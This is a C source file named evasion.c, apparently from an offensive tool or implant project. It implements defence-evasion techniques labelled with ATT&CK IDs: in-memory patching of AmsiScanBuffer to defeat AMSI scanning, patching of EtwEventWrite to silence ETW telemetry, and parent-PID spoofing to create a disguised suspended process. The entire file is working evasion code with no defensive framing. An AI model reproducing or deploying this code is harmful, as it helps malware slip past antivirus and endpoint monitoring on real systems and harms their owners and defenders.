// src/evasion.c
// Mod 83/84: NTDLL unhooking | Mod 105/110: AMSI/ETW patching | Mod 47: PPID spoofing
#include <windows.h>
#include <stdio.h>

// -- Mod 105: AMSI bypass (T1562.001) ---------------------------------
// Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
BOOL patch_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[*] patch_amsi: amsi.dll not loaded (not a PowerShell host)\n");
        return TRUE; // not an error
    }

    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[!] patch_amsi: AmsiScanBuffer not found\n");
        return FALSE;
    }

    // x64 patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect = 0;

    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] patch_amsi: VirtualProtect failed: %ld\n", GetLastError());
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI patched\n");
    return TRUE;
}

// -- Mod 110: ETW bypass (T1562.001) ----------------------------------
// Patches EtwEventWrite in ntdll to return immediately
BOOL patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[!] patch_etw: EtwEventWrite not found\n");
        return FALSE;
    }

    // xor eax, eax; ret (return STATUS_SUCCESS)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD oldProtect = 0;

    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] patch_etw: VirtualProtect failed: %ld\n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] ETW patched\n");
    return TRUE;
}

// -- Mod 47: PPID spoofing (T1036) ------------------------------------
// Creates a process with a spoofed parent PID
BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe,
                PPROCESS_INFORMATION pPi) {
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!si.lpAttributeList) return FALSE;

    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
    if (!hParent) {
        printf("[!] ppid_spoof: OpenProcess(%ld) failed: %ld\n",
               parentPid, GetLastError());
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return FALSE;
    }

    UpdateProcThreadAttribute(si.lpAttributeList, 0,
                              PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);

    BOOL result = CreateProcessA(
        NULL, (LPSTR)targetExe, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, &si.StartupInfo, pPi);

    if (!result) {
        printf("[!] ppid_spoof: CreateProcess failed: %ld\n", GetLastError());
    } else {
        printf("[+] ppid_spoof: Created PID %ld with PPID %ld\n",
               pPi->dwProcessId, parentPid);
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);
    return result;
}
